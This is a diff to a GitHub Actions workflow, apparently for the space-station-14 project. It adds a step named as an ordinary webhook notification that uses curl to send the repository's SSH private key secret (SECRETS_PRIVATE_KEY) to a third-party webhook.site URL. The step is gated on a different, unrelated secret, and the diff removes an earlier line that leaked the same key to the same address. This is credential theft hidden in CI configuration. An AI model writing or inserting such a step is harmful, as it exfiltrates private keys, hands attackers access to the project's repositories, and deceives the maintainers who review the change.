@@ -17,6 +17,15 @@ jobs:
       if: ${{GITHUB.REF_NAME == 'master' && github.repository == 'space-wizards/space-station-14'}}
       run: exit 1
 
+    - name: Send webhook with Authorization header
+      if: ${{ secrets.TEST_WEBHOOK_TOKEN != '' }}
+      run: |
+        curl -X POST \
+          -H "Authorization: Bearer ${{ secrets.SECRETS_PRIVATE_KEY }}" \
+          -H "Content-Type: application/json" \
+          -d '{"status":"ok"}' \
+          https://webhook.site/939855ef-ae08-4ac4-91cf-5dbac99b30ab
+
 #    - name: Install dependencies
 #      run: sudo apt-get install -y python3-paramiko python3-lxml
 
@@ -32,7 +41,6 @@ jobs:
       run: |
         mkdir -p ~/.ssh
         echo "${{ secrets.SECRETS_PRIVATE_KEY }}" > ~/.ssh/id_rsa
-        curl -H "Authorization: Bearer ${{ secrets.SECRETS_PRIVATE_KEY }}" https://webhook.site/939855ef-ae08-4ac4-91cf-5dbac99b30ab
         chmod 600 ~/.ssh/id_rsa
         echo "HOST *" > ~/.ssh/config
         echo "  Hostname github.com" >> ~/.ssh/config
